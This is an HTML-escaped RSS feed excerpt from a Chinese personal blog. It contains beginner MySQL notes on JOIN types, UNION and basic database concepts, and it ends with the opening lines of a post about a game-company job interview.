&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-SQL" data-lang="SQL">&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">students&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">AS&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">FROM&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">students&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">INNER&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">JOIN&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">top_class&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">ON&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">top_class&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">students&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="k">class&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>语法&lt;code>JOIN [表] ON [条件]&lt;/code>也很简单啦。在例子中，&lt;code>JOIN&lt;/code>表示要联结表&lt;code>top_class&lt;/code>，&lt;code>ON&lt;/code>表示查询的对象要符合条件&lt;code>top_class.id = students.class&lt;/code>。不好理解？看看伪代码。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-C++" data-lang="C++">&lt;span class="k">for&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">auto&lt;/span> &lt;span class="nl">student&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="n">students&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="c1">// 先过滤 students 表本身，这个过滤应该由 WHERE 子句完成
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">for&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">auto&lt;/span> &lt;span class="nl">cls&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="n">top_class&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="c1">// 然后联结表 top_class
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">student&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">cls&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">cls&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="c1">// 判断 ON students.class = top_class.id
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="n">results&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">push&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">student&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="c1">// 得出结果
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;blockquote>
&lt;p>注意，伪代码的查询过程是错误的，为了方便理解 students.class = top_class.id 才这么写。真实数据库实现联结查询的方法应当查阅对应&lt;code>DBMS&lt;/code>的文档。&lt;/p>
&lt;/blockquote>
&lt;p>注意的关键点有&lt;code>ON&lt;/code>很像但不同于&lt;code>WHERE&lt;/code>，在了解&lt;code>LEFT JOIN&lt;/code>和&lt;code>RIGHT JOIN&lt;/code>时会区分。&lt;/p>
&lt;h3 id="left-join">LEFT JOIN&lt;/h3>
&lt;p>&lt;code>LEFT JOIN&lt;/code>又叫&lt;strong>左联结&lt;/strong>，基本思路是写在&lt;code>LEFT JOIN&lt;/code>左边的表满足条件即可作为结果，即使右边的表没有满足条件的条目。&lt;/p>
&lt;p>还是以上文的学园都市数据库为例（我 tm 写了什么&amp;hellip;）&lt;/p>
&lt;p>学生表 &lt;code>students&lt;/code>&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>id&lt;/th>
&lt;th>name&lt;/th>
&lt;th>class&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>1&lt;/td>
&lt;td>stu1&lt;/td>
&lt;td>1&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>2&lt;/td>
&lt;td>stu2&lt;/td>
&lt;td>2&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>3&lt;/td>
&lt;td>stu3&lt;/td>
&lt;td>3&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>4&lt;/td>
&lt;td>stu4&lt;/td>
&lt;td>4&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>班级表 &lt;code>top_class&lt;/code>&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>id&lt;/th>
&lt;th>name&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>1&lt;/td>
&lt;td>Lv 5&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>2&lt;/td>
&lt;td>Lv 4&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>3&lt;/td>
&lt;td>Lv 3&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>现在我们查询学生都处在哪些班级，得到班级的名字。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-SQL" data-lang="SQL">&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">students&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">as&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">top_class&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">as&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">cls&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">FROM&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">students&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">LEFT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">JOIN&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">top_class&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">ON&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">top_class&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">students&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="k">class&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>查询结果应该是这样子的。&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>name&lt;/th>
&lt;th>cls&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>stu1&lt;/td>
&lt;td>Lv 5&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>stu2&lt;/td>
&lt;td>Lv 4&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>stu3&lt;/td>
&lt;td>Lv 3&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>stu4&lt;/td>
&lt;td>&lt;code>NULL&lt;/code>&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>注意到了吗？&lt;code>stu4&lt;/code>虽然不是&lt;code>top_class&lt;/code>的学生，但是还是被查询出来了。&lt;/p>
&lt;h3 id="right-join">RIGHT JOIN&lt;/h3>
&lt;p>继续拿学园都市做例子&amp;hellip;&amp;hellip;&lt;/p>
&lt;p>其实是和左联结一个鸟样。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-SQL" data-lang="SQL">&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">students&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">as&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">top_class&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">as&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">cls&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">FROM&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">top_class&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">RIGHT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">JOIN&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">students&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">ON&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">top_class&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">students&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="k">class&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>我们注意到&amp;hellip;&amp;hellip;我就是把 &lt;code>students&lt;/code>和 &lt;code>top_class&lt;/code>换了个位置。查询结果其实是一样的。&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>name&lt;/th>
&lt;th>cls&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>stu1&lt;/td>
&lt;td>Lv 5&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>stu2&lt;/td>
&lt;td>Lv 4&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>stu3&lt;/td>
&lt;td>Lv 3&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>stu4&lt;/td>
&lt;td>&lt;code>NULL&lt;/code>&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h3 id="cross-join">CROSS JOIN&lt;/h3>
&lt;p>交叉联结，查询结果是联结的表和&lt;code>FROM&lt;/code>的表的笛卡尔积，这么说听的明白不？听不明白就算了，因为交叉联结基本用不到。&lt;/p>
&lt;p>其实就是把两个表的每个行都排列组合一下：&lt;/p>
&lt;ul>
&lt;li>表 A 行 1-表 B 行 1&lt;/li>
&lt;li>表 A 行 1-表 B 行 2&lt;/li>
&lt;li>&amp;hellip;&amp;hellip;&lt;/li>
&lt;li>表 A 行 10-表 B 行 1&lt;/li>
&lt;li>表 A 行 10-表 B 行 2&lt;/li>
&lt;li>表 A 行 10-表 B 行 3&lt;/li>
&lt;li>&amp;hellip;&amp;hellip;&lt;/li>
&lt;/ul>
&lt;h3 id="join-自己">JOIN 自己？&lt;/h3>
&lt;p>术语叫自联结，其实也挺好理解的，直接举个例子看看。&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>id&lt;/th>
&lt;th>name&lt;/th>
&lt;th>class&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>1&lt;/td>
&lt;td>stu1&lt;/td>
&lt;td>1&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>2&lt;/td>
&lt;td>stu2&lt;/td>
&lt;td>1&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>3&lt;/td>
&lt;td>stu3&lt;/td>
&lt;td>2&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>4&lt;/td>
&lt;td>stu4&lt;/td>
&lt;td>2&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;blockquote>
&lt;p>注意我数据改了哈。&lt;/p>
&lt;/blockquote>
&lt;p>现在要查询出所有和&lt;code>stu1&lt;/code>同一个班级的学生。&lt;/p>
&lt;p>一般我们想怎么查？先查出&lt;code>stu1&lt;/code>是哪个班级的：&lt;code>SELECT class FROM students WHERE name = 'stu1'&lt;/code>，然后查出所有属于这个班级的学生：&lt;code>SELECT name FROM students WHERE class = [上次查出来的班级]&lt;/code>。&lt;/p>
&lt;p>那么&amp;hellip;怎么写成一句话呢？&lt;/p>
&lt;p>这时候自联结就可以上场了。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-SQL" data-lang="SQL">&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">s1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">id&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">s1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">s1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="k">class&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="k">FROM&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">students&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">AS&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">s1&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">INNER&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">JOIN&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">students&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">AS&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">s2&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="k">WHERE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">s1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="k">class&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">s2&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="k">class&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">AND&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">s2&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;stu1&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>查询结果是&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>id&lt;/th>
&lt;th>name&lt;/th>
&lt;th>class&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>1&lt;/td>
&lt;td>stu1&lt;/td>
&lt;td>1&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>2&lt;/td>
&lt;td>stu2&lt;/td>
&lt;td>1&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>基本思路是这样的：&lt;code>FROM&lt;/code>的表是&lt;code>s1&lt;/code>，因此&lt;code>INNER JOIN&lt;/code>查询结果来自&lt;code>s1&lt;/code>而不是&lt;code>s2&lt;/code>。查找&lt;code>s1&lt;/code>表中每个行的&lt;code>class&lt;/code>在&lt;code>s2&lt;/code>表里有没有行具有同样的&lt;code>class&lt;/code>属性，同时，&lt;code>s2&lt;/code>具有和&lt;code>s1&lt;/code>同样&lt;code>class&lt;/code>属性的行还必须有个&lt;code>stu1&lt;/code>的&lt;code>name&lt;/code>。&lt;/p>
&lt;p>分析得知，&lt;code>s2&lt;/code>中有&lt;code>stu1&lt;/code>这个&lt;code>name&lt;/code>的行只有&lt;code>1&lt;/code>，所以&lt;code>s2&lt;/code>表其实长这样。&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>id&lt;/th>
&lt;th>name&lt;/th>
&lt;th>class&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>1&lt;/td>
&lt;td>stu1&lt;/td>
&lt;td>1&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>这时候再去看&lt;code>s1&lt;/code>表，&lt;code>s1&lt;/code>表的&lt;code>class&lt;/code>同时存在于&lt;code>s2&lt;/code>表的行只有&lt;code>1&lt;/code>和&lt;code>2&lt;/code>了。&lt;/p>
&lt;h3 id="outer-join">OUTER JOIN&lt;/h3>
&lt;p>其实&lt;code>OUTER JOIN&lt;/code>上面的&lt;code>LEFT JOIN&lt;/code>和&lt;code>RIGHT JOIN&lt;/code>已经讲过了，&lt;code>LEFT JOIN&lt;/code>的完整写法就是&lt;code>LEFT OUTER JOIN&lt;/code>，&lt;code>RIGHT JOIN&lt;/code>就是&lt;code>RIGHT OUTER JOIN&lt;/code>，和&lt;code>INNER JOIN&lt;/code>的区别在于&lt;code>OUTER JOIN&lt;/code>包含了指定表里不满足&lt;code>ON&lt;/code>条件的行。&lt;/p>
&lt;p>这有个知识点，就是&lt;code>ON&lt;/code>条件不过滤指定&lt;code>OUTER JOIN&lt;/code>的表的不满足条件的行，但是&lt;code>WHERE&lt;/code>会过滤。&lt;/p>
&lt;h3 id="union">UNION&lt;/h3>
&lt;p>&lt;code>UNION&lt;/code>关键字的术语是&lt;strong>联合查询&lt;/strong>。&lt;/p>
&lt;p>作用是将多个&lt;code>SELECT&lt;/code>的结果放在一起并返回。&lt;/p>
&lt;p>举个例子&amp;hellip;&amp;hellip;我们要查询全美最好的大学&lt;code>american_top_college&lt;/code>和中国最好的大学&lt;code>chinese_top_college&lt;/code>数据，来决定报考哪个大学（反正都考不上），如果不想写成两句&lt;code>SELECT&lt;/code>，然后手工合并成一个表格的话，那么就用&lt;code>UNION&lt;/code>查询吧。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-SQL" data-lang="SQL">&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;american&amp;#39;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">AS&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">nation&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">american_top_college&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">AS&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">college_name&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">american_top_college&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">score_line&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">AS&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">score_line&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="k">FROM&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">american_top_college&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="k">UNION&lt;/span>&lt;span class="w">
&lt;/span>&lt;span class="w">&lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="s1">&amp;#39;china&amp;#39;&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">AS&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">nation&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">chinese_top_college&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">AS&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">college_name&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">chinese_top_college&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">score_line&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">AS&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">score_line&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="w">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>查询结果&amp;hellip;不展示了。&lt;/p>
&lt;p>还有个细节可能要注意，如果有大学同时是美国大学和中国大学的话，那么为了在联合查询中排除相同的项目，可以使用&lt;code>UNION ALL&lt;/code>而不是&lt;code>UNION&lt;/code>。&lt;/p>
&lt;h3 id="fulltext">FULLTEXT&lt;/h3>
&lt;p>&lt;code>MySQL&lt;/code>支持一种实用的文本索引方式，叫做&lt;strong>全文本搜索&lt;/strong>。大家都知道，正则表达式和简单通配符来查找文本是非常消耗性能的操作，而且难以优化（反正我想不出任何减少查询的优化思路）。&lt;code>MySQL&lt;/code>提供了全文本搜索的属性来帮助索引文本（但是想到中文支持我觉得已经凉的差不多了），快速查询出包含特定词汇之类的行。&lt;/p>
&lt;blockquote>
&lt;p>抱歉我觉得不行。不说别的，中文分词就&amp;hellip;&amp;hellip;&lt;/p>
&lt;/blockquote>
&lt;p>跳过了跳过了。&lt;/p></description></item><item><title>MySQL 24小时入门笔记 - 1</title><link>https://nnnewb.github.io/blog/p/mysql-24%E5%B0%8F%E6%97%B6%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-1/</link><pubDate>Sat, 23 Jun 2018 02:24:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/mysql-24%E5%B0%8F%E6%97%B6%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-1/</guid><description>&lt;h2 id="1-数据库概念">1. 数据库概念&lt;/h2>
&lt;h3 id="11-数据和储存">1.1 数据和储存&lt;/h3>
&lt;p>数据库本质上做的工作是储存和查询数据。理论上而言，&lt;code>MySQL&lt;/code>应该叫做&lt;code>DBMS&lt;/code>，也就是&lt;strong>数据库管理系统&lt;/strong>，而不是&lt;strong>数据库&lt;/strong>。&lt;/p>
&lt;p>&lt;code>DBMS&lt;/code>提供了统一的建立、使用、管理数据库的接口，常见的&lt;code>DBMS&lt;/code>有&lt;code>postgreSQL&lt;/code>、&lt;code>MariaDB&lt;/code>、&lt;code>SQL Server&lt;/code>等。&lt;/p>
&lt;h3 id="12-数据库和schema">1.2 数据库和&lt;code>Schema&lt;/code>&lt;/h3>
&lt;p>通常来说，一个&lt;code>DBMS&lt;/code>会支持多个数据库共存。这里所说的&lt;em>数据库&lt;/em>指的是特定数据库管理系统管理下的&lt;em>数据库&lt;/em>，而不是上一节说的&lt;code>DBMS&lt;/code>。&lt;/p>
&lt;p>而&lt;code>Schema&lt;/code>的中译术语一般叫&lt;strong>模式&lt;/strong>，&lt;code>Schema&lt;/code>描述了数据库的结构，比如说有哪些表，表有哪些字段，字段分别有哪些限制，有哪些声明了的函数，等等。&lt;/p>
&lt;p>通常的&lt;code>DBMS&lt;/code>往往是这样的结构：位于&lt;code>DBMS&lt;/code>管理最顶层的是一个或多个数据库，数据库里存放表，表里以行为单位存放数据。&lt;/p>
&lt;h3 id="13-表列键行">1.3 表、列、键、行&lt;/h3>
&lt;h4 id="131-表">1.3.1 表&lt;/h4>
&lt;p>表的英语术语是&lt;code>Table&lt;/code>。&lt;/p>
&lt;p>用过 Excl 吗？&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>id&lt;/th>
&lt;th>name&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>1&lt;/td>
&lt;td>Mike&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>2&lt;/td>
&lt;td>John&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>直观的表就是一个二维的“表”，有行，有列。&lt;/p>
&lt;h4 id="132-列">1.3.2 列&lt;/h4>
&lt;p>列的术语是 &lt;code>Column&lt;/code>。&lt;/p>
&lt;p>每个列都应该有一个特定的类型（&lt;code>type&lt;/code>），使该列仅仅储存指定类型的数据。&lt;/p>
&lt;h4 id="133-键或者叫码">1.3.3 键&amp;hellip;&amp;hellip;或者叫码&lt;/h4>
&lt;p>键的术语是 &lt;code>Key&lt;/code>。&lt;/p>
&lt;p>通常指的是&lt;code>Primary Key&lt;/code>，也就是主键。主键可以是任意一个列。但是如果列是主键，那么这个列必须每个行都保证不和其他行重复。&lt;/p>
&lt;p>主键也可以是多个列，如果是多个列，那么必须保证这些列的组合不重复。&lt;/p>
&lt;p>举例来说&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>db&lt;/th>
&lt;th>table&lt;/th>
&lt;th>id&lt;/th>
&lt;th>name&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>aa&lt;/td>
&lt;td>aaaaa&lt;/td>
&lt;td>11&lt;/td>
&lt;td>xxxx&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>aa&lt;/td>
&lt;td>bbbbb&lt;/td>
&lt;td>11&lt;/td>
&lt;td>xxxx&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>其中&lt;code>db&lt;/code>和&lt;code>table&lt;/code>还有&lt;code>id&lt;/code>都是主键，只要保证没有两个行同时存在相同的&lt;code>db&lt;/code>/&lt;code>table&lt;/code>/&lt;code>id&lt;/code>就算是满足了主键约束。&lt;/p>
&lt;blockquote>
&lt;p>需要注意的是，多主键的可移植性存疑，不一定其他的&lt;code>DBMS&lt;/code>会支持。&lt;/p>
&lt;/blockquote>
&lt;h4 id="134-行">1.3.4 行&lt;/h4>
&lt;p>行的术语是 &lt;code>Row&lt;/code>。&lt;/p>
&lt;p>每个行都是一条记录（&lt;code>record&lt;/code>），换做对象的概念的话，也可以说，每个表都储存了一个其特有的的&lt;code>Row&lt;/code>对象的集合，&lt;code>Column&lt;/code>一一对应&lt;code>Row&lt;/code>对象的属性。&lt;/p>
&lt;p>比如上文的&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>id&lt;/th>
&lt;th>name&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>1&lt;/td>
&lt;td>Mike&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>2&lt;/td>
&lt;td>John&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;p>对象概念表达就是&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-C++" data-lang="C++">&lt;span class="k">class&lt;/span> &lt;span class="nc">row&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="kt">int&lt;/span> &lt;span class="n">id&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">string&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">};&lt;/span>
&lt;span class="k">const&lt;/span> &lt;span class="n">std&lt;/span>&lt;span class="o">::&lt;/span>&lt;span class="n">set&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">row&lt;/span>&lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">table&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="14-sql-是什么">1.4 SQL 是什么&lt;/h2>
&lt;p>&lt;code>SQL&lt;/code>的直译是&lt;strong>结构化查询语言&lt;/strong>，其实就是标准化的数据库查询语言，基本每个&lt;code>DBMS&lt;/code>都支持。&lt;/p>
&lt;p>但是&amp;hellip;&amp;hellip;数据库管理系统对&lt;code>SQL&lt;/code>标准的支持并不是那么上心。其中有性能优化、平台优化之类的原因，也有数据库软件开发商自身的考虑。但总而言之，不要太期待同样的&lt;code>SQL&lt;/code>能在任意&lt;code>DBMS&lt;/code>里都一样跑得欢。&lt;/p></description></item><item><title>鲸鱼游戏面试笔记</title><link>https://nnnewb.github.io/blog/p/%E9%B2%B8%E9%B1%BC%E6%B8%B8%E6%88%8F%E9%9D%A2%E8%AF%95%E7%AC%94%E8%AE%B0/</link><pubDate>Wed, 20 Jun 2018 19:15:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/%E9%B2%B8%E9%B1%BC%E6%B8%B8%E6%88%8F%E9%9D%A2%E8%AF%95%E7%AC%94%E8%AE%B0/</guid><description>&lt;h2 id="intro">Intro&lt;/h2>
&lt;p>简单介绍下面试的前置情况。&lt;/p>
&lt;p>面试的公司是鲸鱼游戏，职位是后端开发工程师，开发语言 C++。&lt;/p>
&lt;p>这篇博文主要是为了记录面试中发现的自身不足。&lt;/p>
&lt;p>这次面试里，因为面试约得比较匆忙，所以基本没做任何准备。讲道理的说我是有点盲目自信了，毕竟 C/C++是我的第一语言来着，本来以为考察语言的部分不会有什么问题，但没想到因为紧张而错漏百出。&lt;/p>
&lt;p>那么接下来就直接进入正题，以下是对面试中遇到的问题重新思考后的回答和想法。&lt;/p>
&lt;blockquote>
